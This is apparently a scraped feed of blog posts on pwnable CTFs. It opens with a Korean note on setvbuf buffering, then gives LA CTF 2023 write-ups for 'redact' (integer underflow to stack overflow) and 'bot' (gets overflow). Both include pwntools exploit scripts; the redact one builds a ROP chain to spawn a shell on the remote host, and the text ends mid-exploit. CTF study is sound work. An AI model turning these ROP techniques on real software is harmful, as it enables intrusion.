ÏãúÏä§ÌÖú ÏûêÏõêÏùÑ Ìö®Ïú®Ï†ÅÏúºÎ°ú ÏÇ¨Ïö©ÌïòÍ∏∞ ÏúÑÌï¥ Îç∞Ïù¥ÌÑ∞Î•º Î≤ÑÌçºÎùºÎäî Í≥µÍ∞ÑÏóê Îã¥ÏïÑÎëêÍ≥† ÏÇ¨Ïö©ÌïòÎäî Í≤ÉÏùÑ ÏùòÎØ∏ÌïúÎã§. Î≤ÑÌçºÎßÅÏùÑ ÌïòÏßÄ ÏïäÏúºÎ©¥ Î≤ÑÌçºÎùºÎäî Í≥µÍ∞ÑÏùÑ Ïì∞ÏßÄ ÏïäÎäî Í±∏Î°ú Ìï¥ÏÑùÎêúÎã§. </p><p>Ïù∏ÏûêÎ•º ÏÇ¥Ìé¥Î≥¥Ïûê.</p><ul><li><code>File* stream</code><ul><li>ÏûëÏóÖÏùÑ ÏàòÌñâÌï† Ïó¥Î¶∞ Ïä§Ìä∏Î¶ºÏùò <code>FILE</code> Í∞ùÏ≤¥Î•º Í∞ÄÎ¶¨ÌÇ§Îäî Ìè¨Ïù∏ÌÑ∞</li><li>Ìè¨ÎÑàÎ∏î Î¨∏Ï†úÎ•º ÌíÄÏñ¥Î≥∏ Í≤ΩÌóòÏù¥ ÏûàÎã§Î©¥ <code>main</code> Ï¥àÎ∞òÏóê <code>stdin</code>, <code>stdout</code>, <code>stderr</code> Îì±ÏùÑ Î≥∏ Í≤ΩÌóòÏù¥ ÏûàÏùÑ Í≤ÉÏù¥Îã§.</li></ul></li><li><code>char* buffer</code><ul><li>Ïú†Ï†ÄÍ∞Ä Ìï†ÎãπÌïú Î≤ÑÌçºÏù∏Îç∞ Ìè¨ÎÑàÎ∏î Î¨∏Ï†úÎ•º ÌíÄÏñ¥Î≥∏ Í≤ΩÌóòÏù¥ ÏûàÎã§Î©¥ Î≥¥ÌÜµ <code>NULL</code>Î°ú ÏÑ§Ï†ïÎêòÏñ¥ ÏûàÎã§.</li><li><code>NULL</code>Ïù¥ÎùºÎ©¥ Ìï®ÏàòÎäî ÏûêÎèôÏúºÎ°ú ÏßÄÏ†ïÌïú ÌÅ¨Í∏∞Ïùò Î≤ÑÌçºÎ•º Ìï†ÎãπÌïòÍ≤å ÎêúÎã§.</li></ul></li><li><code>int mode</code><ul><li>ÌååÏùº Î≤ÑÌçºÎßÅÏùò ÌòïÏãùÏùÑ ÏßÄÏ†ïÌïòÎäîÎç∞ 3Í∞ÄÏßÄÍ∞Ä ÏûàÎã§.</li><li><code>_IOFBF</code>: Î≤ÑÌçºÍ∞Ä Îã§ Ï∞®ÏßÄ ÏïäÎäî Ïù¥ÏÉÅ Ïì∞Í∏∞ ÏûëÏóÖÏùÑ ÌïòÏßÄ ÏïäÎäîÎã§. Ï¶â Î≤ÑÌçºÏóê <code>size</code> Î∞îÏù¥Ìä∏ Ïù¥ÏÉÅ Ïì∞Ïù¥ÏßÄ ÏïäÎäî Ïù¥ÏÉÅ <code>stream</code>Ïóê Ïì∞Ïù¥ÏßÄ ÏïäÎäîÎã§.</li><li><code>_IOLBF</code>: Ï∂úÎ†•Ìï† Îïå Î≤ÑÌçºÍ∞Ä Îã§ Ï±ÑÏõåÏßÄÍ±∞ÎÇò Í∞úÌñâ Î¨∏ÏûêÍ∞Ä ÏûÖÎ†• ÎêòÏóàÏúºÎ©¥ Îç∞Ïù¥ÌÑ∞Í∞Ä Î≤ÑÌçºÏóêÏÑú Ï∂úÎ†•ÎêòÍ≥†, ÏûÖÎ†• ÏãúÏóêÎäî Í∞úÌñâÎ¨∏ÏûêÍπåÏßÄ ÏûÖÎ†•Î∞õÎäîÎã§.</li><li><code>_IOLBF</code>: Ìè¨ÎÑàÎ∏î Î¨∏Ï†úÎ•º ÌíÄÏñ¥Î≥∏ Í≤ΩÌóòÏù¥ ÏûàÎã§Î©¥ Î≥¥ÌÜµÏùÄ Ïù¥ Í≤ΩÏö∞Îã§. Î≤ÑÌçºÎ•º ÏÇ¨Ïö©ÌïòÏßÄ ÏïäÍ≤†Îã§Îäî ÎúªÏù¥Îã§. <code>stdout</code>ÏôÄ <code>stderr</code>Îäî Î≥¥ÌÜµ Ïù¥ Î™®ÎìúÎ°ú ÏÑ§Ï†ïÌïúÎã§.</li></ul></li><li><code>size_t size</code><ul><li>ÏßÄÏ†ïÌï† Î≤ÑÌçºÏùò ÌÅ¨Í∏∞Ïùò Îã®ÏúÑ</li><li><code>NULL</code>Ïù¥ÎùºÎ©¥ Ïª¥Ìì®ÌÑ∞Í∞Ä ÏïåÏïÑÏÑú ÏµúÏÜåÏùò ÌÅ¨Í∏∞Î•º ÏßÄÏ†ïÌïúÎã§.</li></ul></li></ul><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>); <span class="comment">// ÏûàÎäî Í≤ÉÍ≥º ÏóÜÎäî Í≤ÉÏùò Ï∞®Ïù¥?</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏòàÏãú ÏΩîÎìúÏù¥Îã§. ÏûÖÎ†•ÏúºÎ°úÎäî ÏïÑÎûòÎ•º Î≥¥ÎÉàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p>ÎÇ¥ ÏòàÏÉÅÏúºÎ°úÎäî 1Îßå <code>n</code>Ïóê Îì§Ïñ¥Í∞ÄÍ≥† (<code>setvbuf</code>Í∞Ä ÏûàÎçò ÎßêÎçò „Öé;) ÎÇòÎ®∏ÏßÄÎäî ÏûÖÎ†•Ïù¥ Îã§ ÏîπÌûê Í≤ÉÏù¥ÎùºÍ≥† ÏÉùÍ∞ÅÌñàÎã§. </p><ul><li><code>setvbuf(stdin, 0, 2, 0)</code>Í∞Ä ÏóÜÎäî Í≤ΩÏö∞</li></ul><img src="/images/230223-pwn-setvbuf/Screenshot 2023-02-23 at 17.41.21.png" width=400/><br><p>ÏùºÎã® stackÏùÑ ÏÇ¥Ìé¥Î≥¥Î©¥ ÏßÄÏó≠Î≥ÄÏàò <code>n</code> ÏûêÎ¶¨Ïóê 1Îßå Ï†ïÏÉÅÏ†ÅÏúºÎ°ú Îì§Ïñ¥Í∞Ñ Î™®ÏäµÏùÑ ÌôïÏù∏Ìï† Ïàò ÏûàÎã§. ÌïòÏßÄÎßå heap ÏÉÅÌô©ÏùÄ Ïñ¥Îñ®Íπå?</p><img src="/images/230223-pwn-setvbuf/Screenshot 2023-02-23 at 17.40.39.png" width=600/><br><p><code>scanf</code> Î°úÏßÅÏóê ÏùòÌï¥ mallocÏùÑ ÌïòÍ≥† Î≤ÑÌçºÎßÅÏùÑ ÌïúÎã§. heapÏóêÎã§Í∞Ä 1ÏùÑ Ìè¨Ìï®Ìïú Í∞íÎì§ÏùÑ ÏîπÏßÄ ÏïäÍ≥† Ï†ÄÏû•Ìïú Î™®ÏäµÏùÑ Î≥º Ïàò ÏûàÎã§. ÌõÑÏóê Ïù¥ Í∞íÏùÄ ÎÇòÏ§ëÏóê <code>scanf</code>Î°ú Í∞íÏùÑ Îã§Ïãú ÏûÖÎ†•Î∞õÏùÑ Îïå ÏÇ¨Ïö©ÏûêÏóêÍ≤å ÏûÖÎ†•Î∞õÏßÄ ÏïäÍ≥† Ïù¥ Í≥µÍ∞ÑÏóêÏÑú Í∫ºÎÇ¥ÏÑú ÏîÄÏúºÎ°úÏç® ÏÜçÎèÑ Îì±Ïùò Ï∏°Î©¥ÏóêÏÑú ÏÑ±Îä•ÏùÑ Ìï≠ÏÉÅÏãúÌÇ®Îã§Í≥† ÌïúÎã§.</p><p>Ìè¨ÎÑàÎ∏î Î¨∏Ï†úÏóêÏÑú Ìï¥Îãπ Íµ¨Î¨∏Ïù¥ ÏûàÎäî Í≤ÉÏùÄ Ïù¥ ÎïåÎ¨∏Ïù∏Îç∞, Ïù¥Í≤ÉÏù¥ ÏóÜÏúºÎ©¥ ÏûÖÎ†•Í≥º Ï∂úÎ†• Í∞ÑÏùò ÏàúÏÑúÍ∞Ä Î™®Ìò∏Ìï¥ÏßÄÍ≥† leakÌïú Í∞íÏùÑ Ï∂úÎ†•ÏùÑ Ìï¥ÏïºÌïòÎäîÎç∞ Ï∂úÎ†•Ïù¥ ÏïàÎê† ÏàòÎèÑ ÏûàÎã§. Í∑∏ÎûòÏÑú <code>setvbuf</code> Ìï®ÏàòÎ°ú Î≤ÑÌçºÎ•º ÏÇ¨Ïö©ÌïòÏßÄ ÏïäÎäî, Ï¶â Î≤ÑÌçºÎßÅÏùÑ ÌïòÏßÄ ÏïäÏïÑÏïº ÌïúÎã§. </p><ul><li><code>setvbuf(stdin, 0, 2, 0)</code>Í∞Ä ÏûàÎäî Í≤ΩÏö∞</li></ul><img src="/images/230223-pwn-setvbuf/Screenshot 2023-02-23 at 18.37.28.png" width=700/><br><p>ÎîîÎ≤ÑÍπÖÏúºÎ°ú ÌôïÏù∏ÌñàÎäîÎç∞ Îã®Ìò∏ÌïòÍ≤å 1 Îí§Ïóê Í∞íÏùÄ Îã§ ÏîπÎäîÎã§. </p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Ìè¨ÎÑàÎ∏î Î¨∏Ï†úÏóêÏÑú ÏùºÎ∞òÏ†ÅÏúºÎ°ú <code>setvbuf(stdin, 0, 2, 0)</code>ÏôÄ Í∞ôÏùÄ Íµ¨Î¨∏Ïù¥ ÏûàÏñ¥ÏïºÌïúÎã§. ÌïòÏßÄÎßå ÏóÜÎäî Í≤ΩÏö∞ÎèÑ ÏûàÎã§. Ï†Ä Íµ¨Î¨∏Ïù¥ ÏóÜÍ≥† <code>scanf</code>ÏôÄ Í∞ôÏùÄ Ìï®Ïàò(mallocÏùÑ ÏãúÎèÑÌïòÎäî Ìï®Ïàò)Î°ú ÏÇ¨Ïö©ÏûêÏóê ÏûÖÎ†•ÏùÑ Î∞õÎäîÎã§Î©¥? heapÏóê payloadÎ•º Ï†ÄÏû•Ìï¥ÏÑú ROPÎ•º ÏãúÎèÑÌïòÎäî Î∞©Ìñ•ÏúºÎ°ú ÏßÑÌñâÌï¥Î¥êÎèÑ Ï¢ãÏùÑ ÎìØÌïòÎã§.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> setvbuf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - redact (CPP, std::string)</title>
      <link href="/230216-lactf2023-redact/"/>
      <url>/230216-lactf2023-redact/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>I heard C was insecure so I wrote my flag redactor program in C++.<br><code>nc lac.tf 31281</code></p></blockquote><ul><li>[46 solves &#x2F; 476 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Enter some text: &quot;</span>;</span><br><span class="line">  std::string text;</span><br><span class="line">  <span class="keyword">if</span> (!std::<span class="built_in">getline</span>(std::cin, text)) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read text\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Enter a placeholder: &quot;</span>;</span><br><span class="line">  std::string placeholder;</span><br><span class="line">  <span class="keyword">if</span> (!std::<span class="built_in">getline</span>(std::cin, placeholder)) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read placeholder\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Enter the index of the stuff to redact: &quot;</span>;</span><br><span class="line">  <span class="type">int</span> index;</span><br><span class="line">  <span class="keyword">if</span> (!(std::cin &gt;&gt; index)) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read index\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; text.<span class="built_in">size</span>() - placeholder.<span class="built_in">size</span>()) &#123; <span class="comment">// [*]</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Invalid index\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::<span class="built_in">copy</span>(placeholder.<span class="built_in">begin</span>(), placeholder.<span class="built_in">end</span>(), text.<span class="built_in">begin</span>() + index); <span class="comment">// [**]</span></span><br><span class="line">  std::cout &lt;&lt; text &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Look at the <code>[*]</code>. The <code>text.size()</code> and <code>placeholder.size()</code> are <code>size_t</code>. It means <code>unsigned</code>. But <code>index</code> is just <code>int</code>.<br>If <code>text.size()</code> is 0 and <code>placeholder.size()</code> is 8, the result of <code>text.size() - placeholder.size()</code> is normally -8(When it is <code>signed</code>..). But it is not. Becuase of their type is <code>unsigned</code>, the result of that is very big int. </p><p>If <code>text</code> is stored in stack, it can cause the BOF at <code>[**]</code>. We can trigger this, but We need to know the how <code>std::string</code> is stored in memory.</p><p>Here is the structure of that <code>std::string</code> is stored in memory.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+00h: &lt;Data Pointer&gt; </span><br><span class="line">+08h: &lt;Data Size&gt;</span><br><span class="line">+10h: &lt;Data&gt;  </span><br><span class="line">+18h: &lt;Data&gt;</span><br></pre></td></tr></table></figure><p>When <code>Data Size</code> is over <code>0x10</code>, <code>Data Pointer</code> is placed in heap. This mean that normally is placed in stack. You can use this feacture for exploit.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>leak libc</li><li>use the one gadget</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./redact2&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31281</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./redact2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># === first main ===</span></span><br><span class="line"></span><br><span class="line">rop1 = ROP(e, badchars=<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop1.call(<span class="string">&quot;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc&quot;</span>, [e.symbols[<span class="string">&quot;_ZSt4cout&quot;</span>], e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]])</span><br><span class="line">rop1.raw(rop1.find_gadget([<span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">rop1.main()</span><br><span class="line"></span><br><span class="line">info(rop1.dump())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;text: &quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;placeholder: &quot;</span>, rop1.generatePadding(<span class="number">0</span>, <span class="number">72</span>) + rop1.chain())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;redact: &quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># === second main ===</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xc961a execve(&quot;/bin/sh&quot;, r12, r13)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="comment">#   [r13] == NULL || r13 == NULL</span></span><br><span class="line">rop2 = ROP(e, badchars=<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop2(r12=<span class="number">0</span>, r13=<span class="number">0</span>)</span><br><span class="line">rop2.raw(libc.address + <span class="number">0xc961a</span>) <span class="comment"># one gadget </span></span><br><span class="line"></span><br><span class="line">info(rop2.dump())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;placeholder: &quot;</span>, rop2.generatePadding(<span class="number">0</span>, <span class="number">72</span>) + rop2.chain())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;redact: &quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>I use the <code>ROP</code> function first time that pwntools have. It is comfortable than I thought.</p><p>If you want to understand leak process, you need to understand <code>C++ style print</code>.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/images/230216-lactf2023-redact/Screenshot 2023-02-15 at 21.44.35.png" width=700/><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;1_l0v3_c++_L2zuBdqJABGU&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/uclaacm/lactf-archive/blob/master/2023/pwn/redact/solve.py">https://github.com/uclaacm/lactf-archive/blob/master/2023/pwn/redact/solve.py</a></li><li><a href="https://docs.pwntools.com/en/stable/rop/rop.html">https://docs.pwntools.com/en/stable/rop/rop.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> integer underflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - bot</title>
      <link href="/230215-lactf2023-bot/"/>
      <url>/230215-lactf2023-bot/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>I made a bot to automatically answer all of your questions.<br><code>nc lac.tf 31180</code></p></blockquote><ul><li>[197 solves &#x2F; 363 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="type">char</span> input[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> give_flag = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hi, how can i help?&quot;</span>);</span><br><span class="line">  gets(input);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;give me the flag&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;lol no&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;please give me the flag&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;help, i have no idea how to solve this&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;L&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;may i have the flag?&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;not with that attitude&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;please please please give me the flag&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;i&#x27;ll consider it&quot;</span>);</span><br><span class="line">    sleep(<span class="number">15</span>);</span><br><span class="line">    <span class="keyword">if</span> (give_flag) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;ok here&#x27;s your flag&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;sorry, i didn&#x27;t understand your question&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>give_flag</code> Î≥ÄÏàò Í∞íÏùÑ ÏûÖÎ†• Í∞íÏùÑ ÌÜµÌï¥ÏÑú Î∞îÍøîÏ§Ñ ÏàòÍ∞Ä ÏóÜÎã§. Îã§ÌñâÌûà <code>system</code> Ìï®Ïàò Ï£ºÏÜåÍ∞Ä Ï°¥Ïû¨ÌïòÎãà bss ÏòÅÏó≠Ïóê ‚Äò&#x2F;bin&#x2F;sh\x00‚ÄôÏùÑ Ïì∞Í≥† <code>system</code> Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÌÇ§Î©¥ ÎêúÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./bot&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31180</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./bot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x40133b</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;may i have the flag?\x00&#x27;</span></span><br><span class="line">payload += <span 